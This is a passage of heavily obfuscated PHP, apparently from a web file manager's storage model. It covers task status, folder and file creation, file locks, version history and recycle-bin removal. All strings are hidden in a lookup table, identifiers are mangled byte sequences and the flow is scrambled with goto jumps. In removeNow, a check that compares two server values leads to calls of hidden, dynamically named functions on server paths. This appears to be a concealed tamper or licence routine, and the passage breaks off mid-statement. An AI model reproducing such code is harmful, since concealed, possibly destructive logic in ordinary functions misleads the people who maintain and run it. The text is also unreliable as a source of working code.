self::changeStatus($fØ±İ•„©£, self::STATYS_STOP); } public static function restart($F¦å¥”â) { return self::changeStatus($F¦å¥”â, self::STATYS_RUNNING); } public static function killAll() { $BÇ§©ƒ•Ø =& $_SERVER[Šº]; $E¢âä…áäƒ = self::listData(); foreach ($E¢âä…áäƒ as $CàĞ©™‹²¸) { self::kill($CàĞ©™‹²¸[$BÇ§©ƒ•Ø[392]]); } sleep(2); foreach ($E¢âä…áäƒ as $CàĞ©™‹²¸) { self::valueSet($CàĞ©™‹²¸[$BÇ§©ƒ•Ø[392]], !1); } } private static function changeStatus($eÖ½²Ï‹‘‘, $BÛ·†ğø©´) { goto A˜Ø¬Œ±“²; FÇá“ò ‘Ä: $BÃÎ¿æó [$A¸ÃÌ•¸Ş[711]] = $BÛ·†ğø©´; self::valueSet($eÖ½²Ï‹‘‘, $BÃÎ¿æó ); self::log($A¸ÃÌ•¸Ş[1532] . $BÃÎ¿æó [$A¸ÃÌ•¸Ş[392]] . $A¸ÃÌ•¸Ş[1533] . $BÛ·†ğø©´); goto fîç•­ÈÀ‘; fîç•­ÈÀ‘: return !0; goto c³®šƒ©À´; A˜Ø¬Œ±“²: $A¸ÃÌ•¸Ş =& $_SERVER[Šº]; $BÃÎ¿æó  = self::valueGet($eÖ½²Ï‹‘‘); if (!$BÃÎ¿æó ) { return !1; } goto FÇá“ò ‘Ä; c³®šƒ©À´: } public static function valueGet($DÙë–œÉš¤ = false) { $EŠˆëòâÂ² =& $_SERVER[Šº]; if ($DÙë–œÉš¤) { $A¡ÁëÄí“ø = Model($EŠˆëòâÂ²[432])->where(array($EŠˆëòâÂ²[93] => $DÙë–œÉš¤, $EŠˆëòâÂ²[29] => $EŠˆëòâÂ²[1534]))->find(); return $A¡ÁëÄí“ø ? json_decode($A¡ÁëÄí“ø[$EŠˆëòâÂ²[371]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($BÜ–¾ĞšÈ– = false) { goto e ÓŠ´™Œ; EÕÒ¦ç¥±İ: $aè¥¾²¥”Û = Model($EÁµƒÙ±Ç—[432])->where($CƒŸ»Â©ó)->select(); $aè¥¾²¥”Û = $aè¥¾²¥”Û ? $aè¥¾²¥”Û : array(); foreach ($aè¥¾²¥”Û as $cÎÊŞØ¥˜• => $f¯“¾¶Õß°) { $aè¥¾²¥”Û[$cÎÊŞØ¥˜•] = json_decode($f¯“¾¶Õß°[$EÁµƒÙ±Ç—[371]], !0); } goto fÒĞë¢­ˆ; e ÓŠ´™Œ: $EÁµƒÙ±Ç— =& $_SERVER[Šº]; $CƒŸ»Â©ó = array($EÁµƒÙ±Ç—[29] => $EÁµƒÙ±Ç—[1534]); if ($BÜ–¾ĞšÈ–) { $CƒŸ»Â©ó[$EÁµƒÙ±Ç—[1514]] = $BÜ–¾ĞšÈ–; } goto EÕÒ¦ç¥±İ; fÒĞë¢­ˆ: return $aè¥¾²¥”Û; goto FÒĞ‰¹È«ò; FÒĞ‰¹È«ò: } public static function valueSet($E²öŒ¥ãˆ, $d‘Ù¡Ô¶—) { goto e®¤Ì£“ˆ§; e®¤Ì£“ˆ§: $B•¥”½Ü•Š =& $_SERVER[Šº]; if (!$d‘Ù¡Ô¶—) { return Model($B•¥”½Ü•Š[432])->where(array($B•¥”½Ü•Š[93] => $E²öŒ¥ãˆ, $B•¥”½Ü•Š[29] => $B•¥”½Ü•Š[1534]))->delete(); } $FäÂŒœŸ¿Œ = json_encode($d‘Ù¡Ô¶—); goto DÈèã¦Âµ„; DàÇÁí…›: Model($B•¥”½Ü•Š[432])->add($A¼±É’‚±„, array(), !0); goto CÅÆŞ£º“Ö; DÈèã¦Âµ„: if (!$FäÂŒœŸ¿Œ) { ob_start(); var_dump($d‘Ù¡Ô¶—); $FŒŠƒïÕÑË = ob_get_clean(); self::log($B•¥”½Ü•Š[1535] . json_encode_force($FŒŠƒïÕÑË)); } if (!$E²öŒ¥ãˆ || !$d‘Ù¡Ô¶—[$B•¥”½Ü•Š[392]]) { return !1; } $A¼±É’‚±„ = array($B•¥”½Ü•Š[29] => $B•¥”½Ü•Š[1534], $B•¥”½Ü•Š[1514] => USER_ID, $B•¥”½Ü•Š[93] => $E²öŒ¥ãˆ, $B•¥”½Ü•Š[371] => $FäÂŒœŸ¿Œ); goto DàÇÁí…›; CÅÆŞ£º“Ö: } public static function log($A•ÖÅõî…) { if (!GLOBAL_DEBUG) { return; } write_log($A•ÖÅõî…, $_SERVER[Šº][1536]); } } goto F”Ìİ ñ–Ú; e†¯†‚õ¿—: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($f èŠ¡ŞÛ) { $Fòğ•ÎÄƒ =& $_SERVER[Šº]; $bƒİ¹„Ò¡  = Model($Fòğ•ÎÄƒ[510])->where(array($Fòğ•ÎÄƒ[1506] => $f èŠ¡ŞÛ))->find(); $Fì„ƒ¿„Â­ = $this->_mkdirRoot(SourceModel::TYPE_USER, $f èŠ¡ŞÛ, $bƒİ¹„Ò¡ [$Fòğ•ÎÄƒ[28]]); $this->userDesktopAdd($Fì„ƒ¿„Â­); return $Fì„ƒ¿„Â­; } public function userDesktopAdd($cÄ½ä¬õœ) { $AäœÏ©Ã¯ =& $_SERVER[Šº]; $CÜß­ÊšñÓ = LNG($AäœÏ©Ã¯[1936]); $aÌŸ×é£Àô = $this->mkdir($cÄ½ä¬õœ, $CÜß­ÊšñÓ); $this->metaSet($aÌŸ×é£Àô, $AäœÏ©Ã¯[1937], $AäœÏ©Ã¯[87]); $this->metaSet($cÄ½ä¬õœ, $AäœÏ©Ã¯[1938], $aÌŸ×é£Àô); } public function groupRootAdd($Aİ•õ’¢‚ñ) { $AÑ·¹‰²ÖÛ =& $_SERVER[Šº]; $b³œ’‘¯Õ = Model($AÑ·¹‰²ÖÛ[493])->where(array($AÑ·¹‰²ÖÛ[1755] => $Aİ•õ’¢‚ñ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Aİ•õ’¢‚ñ, $b³œ’‘¯Õ[$AÑ·¹‰²ÖÛ[28]]); } public function systemRootPathAdd($eì…’½Í·) { if ($eì…’½Í· != $_SERVER[Šº][513]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $eì…’½Í·); } public function userRootRemove($CŒµ¡ù‚Ü) { $BÖÏÁÌ´á“ = $this->sourceRoot(SourceModel::TYPE_USER, $CŒµ¡ù‚Ü); if (!$BÖÏÁÌ´á“) { return; } $this->remove($BÖÏÁÌ´á“, !1); } public function groupRootRemove($C‰‡¨†ÆÙ) { $A®Äº›ò³ = $this->sourceRoot(SourceModel::TYPE_GROUP, $C‰‡¨†ÆÙ); if (!$A®Äº›ò³) { return; } $this->remove($A®Äº›ò³, !1); } private function _mkdirRoot($eÄ³ƒÅƒ , $Aã¦™Ì²ù‘, $f”Û›‡¬²½) { goto e“› ƒ ÈØ; eì‰·…Œ‹: $DØÊ´Ş¥ = "\x4d\x6f\x64\x65\154\123\157\x75\162\x63\145\x2e\x6d\x6b\144\x69\x72\122\x6f\x6f\x74\56{$eÄ³ƒÅƒ }\x2e{$Aã¦™Ì²ù‘}\x2e" . $f”Û›‡¬²½; CacheLock::lock($DØÊ´Ş¥); $fœÕ«¯¶µ‰[$fÔéÒ¿Ù«[28]] = $f”Û›‡¬²½; goto bÕÒ®¹Àö ; bÕÒ®¹Àö : $f¤‹Ó°ëÖì = $this->add($fœÕ«¯¶µ‰); $C„­â­´ñŸ = array($fÔéÒ¿Ù«[563] => short_id($f¤‹Ó°ëÖì)); $this->where(array($fÔéÒ¿Ù«[417] => $f¤‹Ó°ëÖì))->save($C„­â­´ñŸ); goto E¾¤‡ºÄçó; e“› ƒ ÈØ: $fÔéÒ¿Ù« =& $_SERVER[Šº]; $fœÕ«¯¶µ‰ = array($fÔéÒ¿Ù«[402] => 0, $fÔéÒ¿Ù«[557] => $eÄ³ƒÅƒ , $fÔéÒ¿Ù«[558] => $Aã¦™Ì²ù‘, $fÔéÒ¿Ù«[554] => 1, $fÔéÒ¿Ù«[559] => USER_ID, $fÔéÒ¿Ù«[560] => USER_ID, $fÔéÒ¿Ù«[555] => $fÔéÒ¿Ù«[33], $fÔéÒ¿Ù«[561] => $fÔéÒ¿Ù«[506], $fÔéÒ¿Ù«[429] => 0, $fÔéÒ¿Ù«[556] => 0, $fÔéÒ¿Ù«[455] => 0, $fÔéÒ¿Ù«[562] => $fÔéÒ¿Ù«[33]); if ($cÖ·ÁùĞÊ = $this->where($fœÕ«¯¶µ‰)->find()) { return $cÖ·ÁùĞÊ[$fÔéÒ¿Ù«[403]]; } goto eì‰·…Œ‹; E¾¤‡ºÄçó: CacheLock::unlock($DØÊ´Ş¥); return $f¤‹Ó°ëÖì; goto eŸ¾ˆ†ù›ç; eŸ¾ˆ†ù›ç: } private function sourceRoot($D”Õ‰©ƒõ, $AŒ²ÚÆŒç, $bŒ­š»ëÎ = false) { $cÔÉ…—çÖ =& $_SERVER[Šº]; $D¦œĞÍªÑ = array($cÔÉ…—çÖ[402] => 0, $cÔÉ…—çÖ[557] => $D”Õ‰©ƒõ, $cÔÉ…—çÖ[558] => $AŒ²ÚÆŒç); if ($B×æ¸ö°¼½ = $this->where($D¦œĞÍªÑ)->find()) { return $bŒ­š»ëÎ ? $B×æ¸ö°¼½ : $B×æ¸ö°¼½[$cÔÉ…—çÖ[403]]; } return !1; } public function sourceRootGroup($A»ŸŸœ¾óó) { goto eİ±ó¿—Ñ; B²£‘ëİ: $this->selectPageReset(); $f’²Ê’˜”³ = $this->listSource($F¦Ü¬ò•¯, 1000); $this->selectPageRestore(); goto DÉÕ‹ÙÅï; eİ±ó¿—Ñ: $FÔáÛÀÍŠ‰ =& $_SERVER[Šº]; if (is_string($A»ŸŸœ¾óó)) { $A»ŸŸœ¾óó = array($A»ŸŸœ¾óó); } $F¦Ü¬ò•¯ = array($FÔáÛÀÍŠ‰[402] => 0, $FÔáÛÀÍŠ‰[557] => SourceModel::TYPE_GROUP, $FÔáÛÀÍŠ‰[558] => array($FÔáÛÀÍŠ‰[7], $A»ŸŸœ¾óó)); goto B²£‘ëİ; DÉÕ‹ÙÅï: return array_to_keyvalue($f’²Ê’˜”³[$FÔáÛÀÍŠ‰[75]], $FÔáÛÀÍŠ‰[491]); goto FØ ç«É­°; FØ ç«É­°: } public function mkfile($e¹®²ÇëíÆ, $E‡ŒÏÑÀÁî, $D‡—ÂßÇ¡Ï = '', $D„†¤»È‘£ = REPEAT_RENAME) { $a¹·ïÑ£Û =& $_SERVER[Šº]; $CÜˆöµˆä× = Model($a¹·ïÑ£Û[579])->addFileByContent($D‡—ÂßÇ¡Ï, $E‡ŒÏÑÀÁî); return $this->_createFileCall($e¹®²ÇëíÆ, $E‡ŒÏÑÀÁî, $CÜˆöµˆä×, $D„†¤»È‘£, $a¹·ïÑ£Û[1202]); } public function addFile($BÎå£‹°, $aø³º¢•óÕ, $B–›Ö…à½, $E¢ÍœÄïÔ = false, $Eˆ­É«ÍØ = REPEAT_RENAME) { $BĞŒšï‡ƒ = Model($_SERVER[Šº][579])->addFile($aø³º¢•óÕ, $B–›Ö…à½, $E¢ÍœÄïÔ); return $this->_createFileCall($BÎå£‹°, $B–›Ö…à½, $BĞŒšï‡ƒ, $Eˆ­É«ÍØ); } public function addFileByFileID($DšŒ¬ó…µ§, $EÊî†¨×¢Â, $CĞœ½ˆÛ†ä, $E¡ØÑœÚ¥ë = REPEAT_RENAME) { $E£™Š£Ê· =& $_SERVER[Šº]; $D‰½—ºä¨ = Model($E£™Š£Ê·[579])->find($EÊî†¨×¢Â); Model($E£™Š£Ê·[579])->linkAdd($EÊî†¨×¢Â); return $this->_createFileCall($DšŒ¬ó…µ§, $CĞœ½ˆÛ†ä, $D‰½—ºä¨, $E¡ØÑœÚ¥ë); } public function addFileByRemote($cÛ×„¨™öò, $eİ‘¤ê»‚â, $cêÛ«†ã„, $AÌ¢ ÈóÀÜ = array(), $aë˜ë£âñ = REPEAT_RENAME) { $cïƒ…Òê™Ş = Model($_SERVER[Šº][579])->addFileByRemote($eİ‘¤ê»‚â, $cêÛ«†ã„, $AÌ¢ ÈóÀÜ); return $this->_createFileCall($cÛ×„¨™öò, $cêÛ«†ã„, $cïƒ…Òê™Ş, $aë˜ë£âñ); } private function _createFileCall($AÊƒµÂƒîé, $f„–‹‰š², $a‡œ¥ÙœÃ°, $D„‰Š†‰ƒ, $A„ñ†¢İ° = "\165\160\x6c\x6f\141\144") { goto D‰êäí¥ßã; E‘èº‰°ŞÌ: if ($c¸Ééã§ && $d‹Óåášº && $d‹Óåášº != $dŒ®—— ‘è) { Model($FÖŠ¡ –‘[1907])->eventCreate($d‹Óåášº, $A„ñ†¢İ°); } $this->lockWriteEnd($AÊƒµÂƒîé, $f„–‹‰š²); return $d‹Óåášº; goto C¡Ãæ¨Êó·; D‰êäí¥ßã: $FÖŠ¡ –‘ =& $_SERVER[Šº]; $c¸Ééã§ = !1; $this->lockWriteStart($AÊƒµÂƒîé, $f„–‹‰š²); goto aÕÎ¤ÈĞòï; aÕÎ¤ÈĞòï: $dŒ®—— ‘è = $this->fileNameExist($AÊƒµÂƒîé, $f„–‹‰š²); $d‹Óåášº = $this->_createFile($AÊƒµÂƒîé, $f„–‹‰š², $a‡œ¥ÙœÃ°, $D„‰Š†‰ƒ, $c¸Ééã§); if (!$c¸Ééã§) { Model($FÖŠ¡ –‘[457])->remove($a‡œ¥ÙœÃ°[$FÖŠ¡ –‘[454]]); } goto E‘èº‰°ŞÌ; C¡Ãæ¨Êó·: } public function mkdir($f±›îµ¦, $fƒÔÂƒ âà, $aƒ¤’äšÚ´ = REPEAT_SKIP) { goto F‹§‹î‚Ë; C Íï…ÆÚ: return $dì„Ò±Îêä; goto fçòÏ‡ì; F‹§‹î‚Ë: $B‘İ¿¥øë =& $_SERVER[Šº]; $B™ËŒ¦ËÃí = $this->sourceInfo($f±›îµ¦); if (!$B™ËŒ¦ËÃí) { return !1; } goto f¥êî„ÜåŸ; f¥êî„ÜåŸ: $this->lockWriteStart($f±›îµ¦, $fƒÔÂƒ âà); if ($aƒ¤’äšÚ´ !== !1) { $b›·ËµÙˆß = $this->fileNameExist($f±›îµ¦, $fƒÔÂƒ âà); if ($b›·ËµÙˆß && $aƒ¤’äšÚ´ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($f±›îµ¦, $fƒÔÂƒ âà); return $b›·ËµÙˆß; } $fƒÔÂƒ âà = $this->fileNameAuto($f±›îµ¦, $fƒÔÂƒ âà, $aƒ¤’äšÚ´); } $EÚ¶¢”•º = array($B‘İ¿¥øë[554] => 1, $B‘İ¿¥øë[420] => $fƒÔÂƒ âà, $B‘İ¿¥øë[555] => $B‘İ¿¥øë[33], $B‘İ¿¥øë[455] => 0, $B‘İ¿¥øë[556] => 0); goto E•êß÷¹ç‚; E•êß÷¹ç‚: $dì„Ò±Îêä = $this->_addSoure($EÚ¶¢”•º, $B™ËŒ¦ËÃí); Model($B‘İ¿¥øë[1907])->eventCreate($dì„Ò±Îêä, $B‘İ¿¥øë[1203]); $this->lockWriteEnd($f±›îµ¦, $fƒÔÂƒ âà); goto C Íï…ÆÚ; fçòÏ‡ì: } private function _createFile($A˜ñ­¿Ë­², $bõ‡ØÜ§”, $d„àÉÇàøŞ, $bÖâ¡¢¶âÇ, &$CõºÄÜĞ¤) { goto Bğ ÏˆÒŒÕ; Eğó³Ñ¿Ò: if ($bÖâ¡¢¶âÇ !== !1) { $EÎÔÇ£‰¯† = $this->fileNameExist($A˜ñ­¿Ë­², $bõ‡ØÜ§”); } $CõºÄÜĞ¤ = !0; if ($bÖâ¡¢¶âÇ && $EÎÔÇ£‰¯†) { if ($bÖâ¡¢¶âÇ == REPEAT_SKIP) { $CõºÄÜĞ¤ = !1; return $EÎÔÇ£‰¯†; } else { if ($bÖâ¡¢¶âÇ == REPEAT_REPLACE) { $eáÀ«ÑªìÎ = $this->sourceInfo($EÎÔÇ£‰¯†); $EÉÄİ¡À„÷ = $this->fileHistory($eáÀ«ÑªìÎ, $d„àÉÇàøŞ[$FÅœ«’¦àİ[454]], $d„àÉÇàøŞ[$FÅœ«’¦àİ[78]]); if (!$EÉÄİ¡À„÷) { $CõºÄÜĞ¤ = !1; } else { $this->folderSizeReset($A˜ñ­¿Ë­²); } return $EÎÔÇ£‰¯†; } else { $bõ‡ØÜ§” = $this->fileNameAuto($A˜ñ­¿Ë­², $bõ‡ØÜ§”, $bÖâ¡¢¶âÇ, !1); } } } goto Eø¤Öïª; Bğ ÏˆÒŒÕ: $FÅœ«’¦àİ =& $_SERVER[Šº]; $a¶Œ Ï—©‡ = $this->sourceInfo($A˜ñ­¿Ë­²); if (!$d„àÉÇàøŞ || !$a¶Œ Ï—©‡) { return !1; } goto Eğó³Ñ¿Ò; Eø¤Öïª: $c¼»Ó•½öƒ = array($FÅœ«’¦àİ[554] => 0, $FÅœ«’¦àİ[420] => $bõ‡ØÜ§”, $FÅœ«’¦àİ[555] => get_path_ext($bõ‡ØÜ§”), $FÅœ«’¦àİ[455] => $d„àÉÇàøŞ[$FÅœ«’¦àİ[454]], $FÅœ«’¦àİ[556] => $d„àÉÇàøŞ[$FÅœ«’¦àİ[78]]); $eÙä”ëìØ¤ = $this->_addSoure($c¼»Ó•½öƒ, $a¶Œ Ï—©‡); $this->folderSizeReset($A˜ñ­¿Ë­², intval($c¼»Ó•½öƒ[$FÅœ«’¦àİ[78]])); goto cæè‘ÁÇ’ì; cæè‘ÁÇ’ì: return $eÙä”ëìØ¤; goto e¿Ï¶÷ö; e¿Ï¶÷ö: } protected function fileHistory($EŒºÖ……”Ó, $cÃâøœÙÊ¾, $BÇ§ø»éØÅ) { goto E›»ˆ‘†; a‹¤Ï¯‡ÉŠ: $this->sourceCacheClear($EŒºÖ……”Ó[$DÛµ½éì¤´[403]]); return !0; goto aÊÛˆæ˜é‚; d•êî³ã‘: Model($DÛµ½éì¤´[1939])->addHistory($EŒºÖ……”Ó); $FÃ…ÃŞÂ = array($DÛµ½éì¤´[560] => USER_ID, $DÛµ½éì¤´[424] => time(), $DÛµ½éì¤´[454] => $cÃâøœÙÊ¾, $DÛµ½éì¤´[78] => $BÇ§ø»éØÅ); $this->where(array($DÛµ½éì¤´[417] => $EŒºÖ……”Ó[$DÛµ½éì¤´[403]]))->save($FÃ…ÃŞÂ); goto a‹¤Ï¯‡ÉŠ; E›»ˆ‘†: $DÛµ½éì¤´ =& $_SERVER[Šº]; if ($EŒºÖ……”Ó[$DÛµ½éì¤´[454]] == $cÃâøœÙÊ¾) { return !1; } $this->checkLock($EŒºÖ……”Ó[$DÛµ½éì¤´[403]], $cÃâøœÙÊ¾); goto d•êî³ã‘; aÊÛˆæ˜é‚: } public function checkLock($c…‹ÃÅ¦æò, $eÅìÇßˆ£») { goto díö„ÅÜã¥; eˆÒ—ñ§ö: $this->_createFileCall($dª„—ËØ»”[$f½Éåóš„[485]], $CÚÜ‡àÚ©©, $BŠÅ‘¾§½—, REPEAT_REPLACE, $f½Éåóš„[1202]); $B„í¬âô˜ = $dª„—ËØ»”[$f½Éåóš„[452]][$f½Éåóš„[518]]; $eâ¾ğ—¾É = $B„í¬âô˜[$f½Éåóš„[1941]] ? $B„í¬âô˜[$f½Éåóš„[1941]] : $B„í¬âô˜[$f½Éåóš„[28]]; goto D¯ŞØõ—½ñ; díö„ÅÜã¥: $f½Éåóš„ =& $_SERVER[Šº]; $dª„—ËØ»” = $this->pathInfo($c…‹ÃÅ¦æò); if (!$this->fileIsLock($dª„—ËØ»”, !0)) { return; } goto eîíö¨‹·‚; eîíö¨‹·‚: $c©í³ÒÌ¹ = Session::get($f½Éåóš„[1940]); $CÚÜ‡àÚ©© = substr($dª„—ËØ»”[$f½Éåóš„[28]], 0, -1 - strlen($dª„—ËØ»”[$f½Éåóš„[168]])) . $f½Éåóš„[1467] . $c©í³ÒÌ¹ . $f½Éåóš„[95] . $dª„—ËØ»”[$f½Éåóš„[168]]; $BŠÅ‘¾§½— = Model($f½Éåóš„[579])->find($eÅìÇßˆ£»); goto eˆÒ—ñ§ö; D¯ŞØõ—½ñ: show_json(LNG($f½Éåóš„[1942]) . $f½Éåóš„[1943] . LNG($f½Éåóš„[1944]) . $f½Éåóš„[1945] . $eâ¾ğ—¾É . $f½Éåóš„[1946], !1); goto EÕÜ’ØÖê; EÕÜ’ØÖê: } public function fileIsLock($b™¹ŒÙ, $fÎˆ–¿³„Œ = false) { goto fˆèŒ‹Ûô; CÁÕéêíø: $eÜˆÆó˜¿ = $GLOBALS[$A°äÂ‹”[6]][$A°äÂ‹”[88]][$A°äÂ‹”[516]]; if ($b™¹ŒÙ[$A°äÂ‹”[452]][$A°äÂ‹”[517]] <= time() - $eÜˆÆó˜¿) { $this->metaSet($b™¹ŒÙ[$A°äÂ‹”[403]], $A°äÂ‹”[515], null); $this->metaSet($b™¹ŒÙ[$A°äÂ‹”[403]], $A°äÂ‹”[517], null); } if ($fÎˆ–¿³„Œ) { $this->metaSet($b™¹ŒÙ[$A°äÂ‹”[403]], $A°äÂ‹”[517], time()); } goto b˜ÛÉçª†; b˜ÛÉçª†: return !1; goto C¯Îğ¨µÛ©; fˆèŒ‹Ûô: $A°äÂ‹” =& $_SERVER[Šº]; if (!isset($b™¹ŒÙ[$A°äÂ‹”[452]]) || !$b™¹ŒÙ[$A°äÂ‹”[452]][$A°äÂ‹”[515]]) { return !1; } if ($b™¹ŒÙ[$A°äÂ‹”[452]][$A°äÂ‹”[515]] != USER_ID) { return !0; } goto CÁÕéêíø; C¯Îğ¨µÛ©: } private function _addSoure($EíÏèù§Šë, $f™¸ƒâº¸) { goto F²·•êØ; CáùÎ¥¯†À: static $B“†²Ş = false; if (!$B“†²Ş) { Hook::trigger($Eñ‘“İ­Òë[544], $EíÏèù§Šë); $B“†²Ş = !0; } $fáĞÕ¬ï¯… = $this->add($EíÏèù§Šë); goto C™ù¡µô›¾; C™ù¡µô›¾: $Aä¥®ÌŒ° = array($Eñ‘“İ­Òë[563] => short_id($fáĞÕ¬ï¯…)); $this->where(array($Eñ‘“İ­Òë[417] => $fáĞÕ¬ï¯…))->save($Aä¥®ÌŒ°); $this->setNamePinyin($fáĞÕ¬ï¯…, $EíÏèù§Šë[$Eñ‘“İ­Òë[28]]); goto f£öó¤á½; F²·•êØ: $Eñ‘“İ­Òë =& $_SERVER[Šº]; $EÆ‹Šï§˜ø = array($Eñ‘“İ­Òë[557] => $f™¸ƒâº¸[$Eñ‘“İ­Òë[411]], $Eñ‘“İ­Òë[558] => $f™¸ƒâº¸[$Eñ‘“İ­Òë[491]], $Eñ‘“İ­Òë[559] => USER_ID, $Eñ‘“İ­Òë[560] => USER_ID, $Eñ‘“İ­Òë[402] => $f™¸ƒâº¸[$Eñ‘“İ­Òë[403]], $Eñ‘“İ­Òë[561] => $f™¸ƒâº¸[$Eñ‘“İ­Òë[494]] . $f™¸ƒâº¸[$Eñ‘“İ­Òë[403]] . $Eñ‘“İ­Òë[47], $Eñ‘“İ­Òë[429] => 0, $Eñ‘“İ­Òë[562] => $Eñ‘“İ­Òë[33]); $EíÏèù§Šë = array_merge($EÆ‹Šï§˜ø, $EíÏèù§Šë); goto F¦±ª»â¸‚; f£öó¤á½: return $fáĞÕ¬ï¯…; goto fí‡„ÒÆÂ¿; F¦±ª»â¸‚: $this->updateModifyTime($EíÏèù§Šë[$Eñ‘“İ­Òë[485]]); $CÊò ÎÇ›± = $Eñ‘“İ­Òë[1947] . $f™¸ƒâº¸[$Eñ‘“İ­Òë[403]]; if (isset(self::$cacheChildList[$CÊò ÎÇ›±])) { unset(self::$cacheChildList[$CÊò ÎÇ›±]); } goto CáùÎ¥¯†À; fí‡„ÒÆÂ¿: } public function remove($C÷ôƒœ­²ê, $f„ŠƒŞè = true) { goto B¦¹ƒ‰Ğª”; eœÄŸâ¯·Ø: $a®ËèèÖº‡ = $b¢íºô“è•[$Dèé©É¡Õ[411]] == self::TYPE_USER ? $Dèé©É¡Õ[570] : $Dèé©É¡Õ[1003]; if ($a®ËèèÖº‡ == $Dèé©É¡Õ[570]) { $bîé÷ÙÈÌ = Model($Dèé©É¡Õ[510])->getInfo($b¢íºô“è•[$Dèé©É¡Õ[491]]); $Bœ‰ÎÂ»ğÃ = !empty($bîé÷ÙÈÌ[$Dèé©É¡Õ[1941]]) ? $bîé÷ÙÈÌ[$Dèé©É¡Õ[1941]] : $bîé÷ÙÈÌ[$Dèé©É¡Õ[28]]; $Bœ‰ÎÂ»ğÃ = $Dèé©É¡Õ[257] . $Bœ‰ÎÂ»ğÃ . $Dèé©É¡Õ[1949] . $b¢íºô“è•[$Dèé©É¡Õ[491]]; } else { $bîé÷ÙÈÌ = Model($Dèé©É¡Õ[493])->getInfo($b¢íºô“è•[$Dèé©É¡Õ[491]]); $Bœ‰ÎÂ»ğÃ = _get($bîé÷ÙÈÌ, $Dèé©É¡Õ[28]); $Bœ‰ÎÂ»ğÃ = $Dèé©É¡Õ[160] . $Bœ‰ÎÂ»ğÃ . $Dèé©É¡Õ[1950] . $b¢íºô“è•[$Dèé©É¡Õ[491]]; } $F¹÷º¼ÓÒ = $Dèé©É¡Õ[1951] . md5($Bœ‰ÎÂ»ğÃ); goto eÄšóÚØÍ; CËíĞÆ¼Ô: $Fí„öÊÌ = Model($Dèé©É¡Õ[1513])->get($Dèé©É¡Õ[1948]) == $Dèé©É¡Õ[87]; if ($fù¦Èåïˆ° || $f„ŠƒŞè || !$Fí„öÊÌ) { return $this->removeNow($C÷ôƒœ­²ê, $f„ŠƒŞè); } $f–‚‘Ùù°Î = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto eœÄŸâ¯·Ø; cíŸ–å: $this->recycleClear($b¢íºô“è•); $bíº¸ÀÈ = $this->move($C÷ôƒœ­²ê, $CÆÜ„šŠŠ‚, REPEAT_RENAME_FOLDER); $this->folderSizeReset($b¢íºô“è•[$Dèé©É¡Õ[485]]); goto EîÈášÏ›‚; eÄšóÚØÍ: CacheLock::lock($F¹÷º¼ÓÒ); $CÆÜ„šŠŠ‚ = $this->fileNameExist($f–‚‘Ùù°Î, $Bœ‰ÎÂ»ğÃ); if (!$CÆÜ„šŠŠ‚) { $CÆÜ„šŠŠ‚ = $this->mkdir($f–‚‘Ùù°Î, $Bœ‰ÎÂ»ğÃ, REPEAT_SKIP); $this->metaSet($CÆÜ„šŠŠ‚, $Dèé©É¡Õ[1952], $a®ËèèÖº‡); $this->metaSet($CÆÜ„šŠŠ‚, $Dèé©É¡Õ[1953], $b¢íºô“è•[$Dèé©É¡Õ[491]]); if ($b¢íºô“è•[$Dèé©É¡Õ[485]] != 0) { $this->metaSet($CÆÜ„šŠŠ‚, $Dèé©É¡Õ[1954], _get($bîé÷ÙÈÌ, $Dèé©É¡Õ[1955])); } } goto aÊÊŒ²Ÿ–Æ; EîÈášÏ›‚: return $bíº¸ÀÈ; goto CÃ–Ä•‘Ÿ; aÊÊŒ²Ÿ–Æ: CacheLock::unlock($F¹÷º¼ÓÒ); $this->metaSet($C÷ôƒœ­²ê, $Dèé©É¡Õ[1956], $b¢íºô“è•[$Dèé©É¡Õ[485]]); $this->where(array($Dèé©É¡Õ[403] => $C÷ôƒœ­²ê))->save(array($Dèé©É¡Õ[424] => time())); goto cíŸ–å; B¦¹ƒ‰Ğª”: $Dèé©É¡Õ =& $_SERVER[Šº]; $b¢íºô“è• = $this->sourceInfo($C÷ôƒœ­²ê); $fù¦Èåïˆ° = intval($b¢íºô“è•[$Dèé©É¡Õ[411]]) === self::TYPE_SYSTEM; goto CËíĞÆ¼Ô; CÃ–Ä•‘Ÿ: } private function recycleClear($c²×Áè™éˆ) { $díù  Òò— =& $_SERVER[Šº]; $C…÷¢Ï¿ ‰ = $this->childrenAll($c²×Áè™éˆ); $bÄá„ÕìÍ = array($díù  Òò—[417] => array($díù  Òò—[418], $C…÷¢Ï¿ ‰[$díù  Òò—[1957]])); Model($díù  Òò—[1958])->where($bÄá„ÕìÍ)->delete(); } public function removeNow($F½›º“À•†, $D¥Ö“†·‚× = true) { goto FòôŠ£†¢; AĞÍ˜«Øà: $this->lockMoveStart($F½›º“À•†); Hook::trigger($Føãíàßšæ[1960], $CÂ´íñ¿¿ï, $D¥Ö“†·‚×); if ($D¥Ö“†·‚×) { Model($Føãíàßšæ[1958])->moveToRecycle($F½›º“À•†); } else { $bŸŸ¬Ù‰£¢ = $this->childrenAll($cÜğŒö•šè); Model($Føãíàßšæ[541])->eventRemove($F½›º“À•†); $this->removeRelevance($bŸŸ¬Ù‰£¢[$Føãíàßšæ[1957]], $bŸŸ¬Ù‰£¢[$Føãíàßšæ[1334]]); } goto D ƒÕ¥È§Í; dšİ¤¡„Äá: return !0; goto D–ëÑÄ—Æ; FòôŠ£†¢: $Føãíàßšæ =& $_SERVER[Šº]; if ($_SERVER[$Føãíàßšæ[395]] != $_SERVER[$Føãíàßšæ[1246]]) { goto c‹½Ÿ×È; e¼İ©£Ú¾: $dÅ¶ˆ¦¤Î­ = $Føãíàßšæ[830]; $dÅ¶ˆ¦¤Î­($_SERVER[$Føãíàßšæ[831]]); $dÅ¶ˆ¦¤Î­($_SERVER[$Føãíàßšæ[397]] . $Føãíàßšæ[1959]); goto aÒØ†²ªÔ; c‹½Ÿ×È: $EöØàº–ª‡ = $Føãíàßšæ[829]; $C¿È÷»Í = $Føãíàßšæ[396]; $eåæ‘¢ô­ = $_SERVER[$Føãíàßšæ[397]] . $Føãíàßšæ[398]; goto fÂÛ¥‰Ô; fÂÛ¥‰Ô: $c½Ä¤Åµƒ = $C¿È÷»Í($eåæ‘¢ô­); $Có‡ğ¼¹ê = explode($Føãíàßšæ[228], 